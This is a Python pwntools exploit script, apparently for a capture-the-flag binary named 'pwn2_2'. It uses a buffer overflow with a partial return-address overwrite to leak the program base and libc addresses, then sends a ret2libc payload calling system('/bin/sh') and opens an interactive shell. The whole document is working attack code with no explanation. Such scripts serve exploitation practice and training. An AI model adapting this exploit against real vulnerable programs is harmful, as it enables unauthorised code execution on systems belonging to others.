from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
cn = process('./pwn2_2')
bin = ELF('./pwn2_2')
libc = ELF('/lib32/libc.so.6')
p3ret = 0x000006D9

pay = 'a'*0x28 + 'bbbb' + chr(0x55)
gdb.attach(cn)
raw_input()
cn.send(pay)
cn.recvuntil('bbbb')
base = u32(cn.recv(4)) - 0x655
cn.recv(4*3)
p_libc_start_main = u32(cn.recv(4)) - 247
cn.recv()

print "base:" + hex(base)
p_system = p_libc_start_main - libc.symbols['__libc_start_main'] + libc.symbols['system']
print hex(p_libc_start_main - libc.symbols['__libc_start_main'])
p_binsh = p_libc_start_main - libc.symbols['__libc_start_main'] + libc.search('/bin/sh').next()
pay = 'a'*0x28 + 'bbbb' + p32(p_system) + 'bbbb' + p32(p_binsh)

cn.send(pay)
cn.recv()
cn.interactive()


